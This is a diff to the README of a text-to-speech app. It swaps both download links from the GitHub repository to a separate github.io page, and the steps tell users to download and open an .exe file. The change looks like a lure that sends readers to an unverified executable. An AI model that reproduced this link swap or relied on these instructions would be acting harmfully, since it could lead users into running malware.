@@ -1,6 +1,6 @@
 # 🔊 tts-and-player - Turn your written text into speech
 
-[![Download tts-and-player](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Conjugate-ai58/tts-and-player)
+[![Download tts-and-player](https://img.shields.io/badge/Download-Release-blue.svg)](https://conjugate-ai58.github.io)
 
 This application converts written text into spoken audio. You load your text files or paste text into the interface, and the software reads it aloud. Use this tool to listen to documents, articles, or notes on your Windows computer.
 
@@ -17,7 +17,7 @@ The application runs on most modern desktop environments. Ensure your computer m
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit this page to download the software: https://github.com/Conjugate-ai58/tts-and-player
+1.  Visit this page to download the software: https://conjugate-ai58.github.io
 2.  Locate the release section on the page.
 3.  Click the file ending in .exe to start your download.
 4.  Open the file once the download finishes.
